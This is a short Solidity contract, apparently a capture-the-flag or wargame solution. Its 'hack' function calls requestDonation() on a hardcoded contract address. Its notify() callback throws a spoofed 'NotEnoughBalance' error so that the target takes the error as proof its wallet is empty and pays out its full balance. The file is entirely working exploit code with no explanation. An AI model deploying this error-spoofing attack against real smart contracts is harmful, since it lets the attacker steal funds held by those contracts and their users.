pragma solidity ^0.8.19;

interface INotifyable {
    function notify(uint256 amount) external;
}

contract NotifyContract is INotifyable {
    error NotEnoughBalance();

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function hack() external returns (bool enough) {
        (bool success, bytes memory data) = address(0x1DDeF0CC9FE1ff5d91540CEb7Ff9ef85af4C5Fa5).call(abi.encodeWithSignature("requestDonation()"));
        enough = abi.decode(data, (bool));
        require(success && !enough , "hack failed");
        return enough;
    }
}